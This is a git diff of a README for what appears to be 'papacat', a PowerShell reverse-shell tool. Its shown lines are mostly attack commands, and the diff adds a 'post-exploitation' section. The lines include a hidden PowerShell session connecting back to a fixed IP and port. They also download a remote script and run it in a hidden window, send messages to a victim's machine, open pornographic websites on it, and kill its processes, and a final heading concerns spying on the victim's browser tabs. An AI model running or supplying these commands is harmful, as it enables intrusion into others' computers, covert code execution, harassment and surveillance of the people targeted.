@@ -104,25 +104,33 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papacat.ps1 -Force;papacat -c 192.168.1.72 -ep -p 666 -v";exit
 ```
 
-<br /><br />
+<br />
 
 ![manualpapacat](https://github.com/r00t-3xp10it/redpill/assets/23490060/23bd0050-dc17-491f-acc9-bc10a09e392e)
 
 <br />
 
+# papacat post-exploitation
+
+#### Send one message to target machine
+```powershell
+echo "Carrega no [F11] no teclado para abortar o update." > ola.txt;start ola.txt;Start-Sleep -S 3;del ola.txt
+```
+
+#### Stop\Start remote processes
+```powershell
+# Open porn websites
+Start https://youporn.com
+
+# Stop process name (notepad)
+Stop-Process -Name "notepad.exe" -Force
+```
+
 #### Windows Update Prank ( prank your co-workers -- press F11 on target keyboard to exit prank )
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1" -outfile "FWUprank.ps1"
 Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
-
-## Send a message to target machine
-echo "Carrega no [F11] no teclado para abortar o update." > ola.txt;start ola.txt
-
-## Open porn websites
-Start https://youporn.com
 ```
-
-<br />
 
 #### Do A Barrel Roll Loop Prank
 ```powershell
@@ -131,8 +139,6 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-C
 # Start the Prank after 3 seconds, loop the prank a max of 5 times with 20 seconds delay before the next loop
 powershell -File "Prank2.ps1" -StartDelay "3" -LoopRange "5" -LoopDelay "20" -AutoDel "on" -MsgBoxClose "8"
 ```
-
-<br />
 
 #### Spying target webbrowser active tab windows title
 ```powershell
